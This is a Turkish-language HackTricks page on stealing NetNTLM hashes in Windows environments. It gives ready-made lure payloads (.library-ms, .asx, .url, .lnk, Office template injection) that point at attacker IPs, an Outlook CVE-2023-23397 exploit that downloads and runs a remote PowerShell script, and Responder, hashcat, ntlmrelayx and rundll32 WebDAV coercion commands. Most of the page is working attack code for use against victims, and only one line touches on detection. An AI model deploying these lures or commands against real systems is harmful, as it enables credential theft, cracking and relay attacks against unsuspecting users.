# NTLM creds Çalınabilecek Yerler

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) adresindeki, online bir microsoft word dosyasının indirilmesinden ntlm leaks kaynağına kadar tüm harika fikirleri inceleyin: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Yazılabilir SMB share + Explorer tarafından tetiklenen UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

**Kullanıcıların veya scheduled jobs'ların Explorer'da göz attığı bir share'e yazabiliyorsanız**, metadata'sı UNC'nize işaret eden dosyalar bırakın (ör. `\\ATTACKER\share`). Klasörün görüntülenmesi **implicit SMB authentication** tetikler ve listener'ınıza bir **NetNTLMv2** leak eder.<sup>[[1]](#references)</sup>

1. **Lures oluşturun** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. kapsamındadır.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Bunları yazılabilir paylaşıma bırakın** (kurbanın açtığı herhangi bir klasör):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Dinle ve crack et**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows aynı anda birden fazla dosyaya erişebilir; Explorer'ın önizlediği her şey (`BROWSE TO FOLDER`) tıklama gerektirmez.

### Windows Media Player playlists (.ASX/.WAX)

Bir hedefin kontrol ettiğiniz bir Windows Media Player playlist'ini açmasını veya önizlemesini sağlayabilirseniz, girdiyi bir UNC path'e yönlendirerek Net-NTLMv2 leak edebilirsiniz. WMP, başvurulan medyayı SMB üzerinden getirmeye çalışır ve otomatik olarak authenticate olur.<sup>[[3]](#references)[[4]](#references)</sup>

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Toplama ve cracking akışı:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, ZIP arşivi içinden doğrudan açıldıklarında .library-ms dosyalarını güvenli olmayan şekilde işler. Kütüphane tanımı uzak bir UNC yolunu (ör. `\\attacker\share`) gösteriyorsa, ZIP içindeki .library-ms dosyasına yalnızca göz atmak/başlatmak bile Explorer'ın UNC yolunu numaralandırmasına ve saldırgana NTLM kimlik doğrulaması göndermesine neden olur. Bu, offline olarak crack edilebilecek veya potansiyel olarak relay edilebilecek bir NetNTLMv2 elde edilmesini sağlar.<sup>[[2]](#references)</sup>

Saldırgan UNC yolunu gösteren minimal .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasyonel adımlar
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname’inizi ayarlayın).
- Dosyayı ZIP’leyin (Windows’ta: Send to → Compressed (zipped) folder) ve ZIP’i hedefe gönderin.
- Bir NTLM capture listener çalıştırın ve kurbanın ZIP’in içinden .library-ms dosyasını açmasını bekleyin.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows, calendar öğelerindeki extended MAPI property PidLidReminderFileParameter’ı işliyordu. Bu property bir UNC path’e (ör. \\attacker\share\alert.wav) işaret ederse Outlook, reminder tetiklendiğinde SMB share’e bağlanarak kullanıcının Net-NTLMv2 bilgisini herhangi bir tıklama olmadan leak ediyordu. Bu açık 14 Mart 2023’te patch’lendi, ancak legacy/untouched fleet’ler ve geçmişe dönük incident response için hâlâ oldukça önemlidir.<sup>[[5]](#references)</sup>

PowerShell (Outlook COM) ile hızlı exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener tarafı:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notlar
- Bir victim'ın yalnızca reminder tetiklendiğinde Outlook for Windows çalışıyor olmalıdır.
- leak, offline cracking veya relay için uygun Net‑NTLMv2 verir (pass-the-hash değildir).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 bypass'i)

Windows Explorer shortcut icon'larını otomatik olarak render eder. Yakın tarihli araştırmalar, Microsoft'un UNC-icon shortcut'ları için Nisan 2025 patch'inden sonra bile shortcut target'ını bir UNC path üzerinde barındırıp icon'u local tutarak hiçbir tıklama olmadan NTLM authentication tetiklemenin mümkün olduğunu gösterdi (patch bypass için CVE‑2025‑50154 atandı). Klasörü yalnızca görüntülemek, Explorer'ın remote target'tan metadata almasına ve attacker'ın SMB server'ına NTLM göndermesine neden olur.<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) PowerShell aracılığıyla:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Teslim fikirleri
- Kısayolu bir ZIP içine bırakın ve kurbanın bu ZIP'e göz atmasını sağlayın.
- Kısayolu, kurbanın açacağı yazılabilir bir share üzerine yerleştirin.
- Explorer'ın öğeleri önizlemesi için aynı klasördeki diğer lure dosyalarıyla birleştirin.

### ExtraData icon path üzerinden no-click .LNK NTLM leak (CVE‑2026‑25185)

Windows, `.lnk` metadata'sını yalnızca çalıştırma sırasında değil, **görüntüleme/önizleme** sırasında da (icon rendering) yükler. CVE‑2026‑25185, **ExtraData** bloklarının shell'in bir icon path'i çözümlemesine ve dosya sistemine **yükleme sırasında** erişmesine neden olduğu bir parsing yolunu gösterir; path remote olduğunda outbound NTLM gönderilir.

Temel tetikleme koşulları (`CShellLink::_LoadFromStream` içinde gözlemlenmiştir):
- ExtraData içine **DARWIN_PROPS** (`0xa0000006`) ekleyin (icon update routine'e geçiş sağlar).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) ekleyin ve **TargetUnicode** alanını doldurun.
- Loader, `TargetUnicode` içindeki environment variables'ı genişletir ve ortaya çıkan path üzerinde `PathFileExistsW` çağırır.

`TargetUnicode` bir UNC path'e (ör. `\\attacker\share\icon.ico`) çözümlenirse, shortcut'ı içeren bir klasörü **yalnızca görüntülemek** bile outbound authentication oluşturur. Aynı load path'i **indexing** ve **AV scanning** tarafından da tetiklenebilir; bu da onu pratik bir no-click leak yüzeyi hâline getirir.<sup>[[7]](#references)</sup>

Bu yapıları Windows GUI kullanmadan oluşturmak/incelemek için **LnkMeMaybe** projesinde research tooling (parser/generator/UI) mevcuttur.<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie` üzerinden WebDAV auth coercion / credential validation

Native **WebDAV client**, mevcut logon session'ını rastgele bir **HTTP/WebDAV** endpoint'ine authenticate olmaya zorlamak için kötüye kullanılabilir:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Neden kullanışlıdır:
- **Saldırganın kontrolündeki bir WebDAV server** karşısında, özel bir client bırakmadan **HTTP üzerinden NTLM** tetikleyebilir.
- **Dahili hostlar** karşısında, yanal harekete geçmeden önce çalınan kimlik bilgilerinin nerelerde kabul edildiğini **sessizce doğrulamak** için kullanılabilir.<sup>[[9]](#references)</sup>
- **SMB egress** filtrelenmiş, ancak **HTTP/WebDAV** hâlâ erişilebilir durumdaysa komut iyi bir alternatiftir.

Operasyonel notlar:
- Kaynak host üzerinde **WebClient** service çalışıyor olmalıdır.
- `rundll32.exe`, `davclnt.dll` dosyasını yükler ve Windows'un WebDAV authentication işlemini **mevcut kullanıcının kimlik bilgilerini** kullanarak gerçekleştirmesini sağlar.<sup>[[10]](#references)</sup>
- Komutu kontrol ettiğiniz altyapıya yönlendiriyorsanız aşağıdaki gibi NTLM-aware bir HTTP listener/relay kullanın:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Detection perspective açısından, çok sayıda internal system üzerinde tekrarlanan `rundll32.exe davclnt.dll,DavSetCookie` çalıştırmaları, normal kullanıcı davranışından ziyade **credential validation / spray-like lateral movement prep** için güçlü bir sinyaldir.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) ile NTLM'i zorlamak

Office documents harici bir template'e referans verebilir. Ekli template'i bir UNC path olarak ayarlarsanız, document'ı açmak SMB'ye authenticate olur.

Minimal DOCX relationship değişiklikleri (word/ içinde):

1) word/settings.xml dosyasını düzenleyin ve ekli template referansını ekleyin:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'yi UNC'nize yönlendirin:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx'e yeniden paketleyin ve teslim edin. SMB capture listener'ınızı çalıştırın ve dosyanın açılmasını bekleyin.

NTLM'i relay etme veya kötüye kullanma hakkındaki post-capture fikirleri için şuraya bakın:

{{#ref}}
README.md
{{#endref}}


## Referanslar
- [1] [HTB: Breach – Yazılabilir share tuzakları + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 ile DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → webroot'a NTFS junction ile RCE → FullPowers + GodPotato ile SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerability: Microsoft'ta patch'lenmemiş privilege escalation tehditleri](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft, Outlook EoP'yi (CVE‑2023‑23397) azaltıyor ve PidLidReminderFileParameter üzerinden NTLM leak'i açıklıyor](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 incelemesi](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT Support aradığında: Teams'ten Domain Compromise'a bir ModeloRAT campaign'ini incelemek](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header'ı](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
